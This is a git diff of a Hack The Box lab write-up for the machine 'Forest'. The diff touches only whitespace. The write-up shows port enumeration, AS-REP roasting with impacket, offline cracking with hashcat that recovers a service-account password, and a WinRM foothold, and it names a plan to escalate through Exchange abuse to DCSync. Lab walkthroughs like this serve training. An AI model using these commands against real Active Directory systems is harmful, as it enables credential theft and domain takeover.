@@ -1,6 +1,7 @@
 # HTB: Forest
 
 ## Engagement Overview
+
 **Target:** Forest
 **Box IP:** 10.10.10.161
 **Local IP:** 10.10.14.2
@@ -9,6 +10,7 @@
 ---
 
 ### Objectives
+
 - Enumerate Active Directory/Exchange environment and identify weak Kerberos/LDAP configurations.  
 - Obtain an AS-REP roastable TGT, crack offline to recover service account credentials.  
 - Use service account to escalate (Exchange abuse → DCSync) and obtain Domain Administrator.  
@@ -26,7 +28,7 @@ nmap -p- -sC -sV -oA forest-scan 10.10.10.161
 - 53/tcp (DNS), 88/tcp (Kerberos), 135/tcp (MS RPC), 139/tcp (NetBIOS), 389/tcp (LDAP), 445/tcp (SMB), 464/tcp (kpasswd), 593/tcp (RPC/HTTP), 636/tcp (LDAPS), 3268/tcp (GC LDAP), 3269/tcp (GC LDAPS)
 
 **Domain info discovered:**
-- Domain: `htb.local`  
+- Domain: `htb.local`
 - Hostname/FQDN: `FOREST.htb.local`  
 - OS: Windows Server 2016 Standard
 
@@ -37,18 +39,21 @@ Notes: anonymous LDAP binds allowed; message signing required on SMB; Kerberos p
 ## Initial Access
 
 ### AS-REP Roasting (Kerberos pre-auth disabled)
+
 ```bash
 impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
 # output: AS-REP roastable hash for svc-alfresco
 ```
 
 ### Crack hash offline
+
 ```bash
 hashcat -m 18200 -a 0 hash.txt wordlist.txt
 # recovered: svc-alfresco:s3rvice
 ```
 
 ### Authenticate & foothold
+
 ```bash
 evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
 # authenticated as svc-alfresco
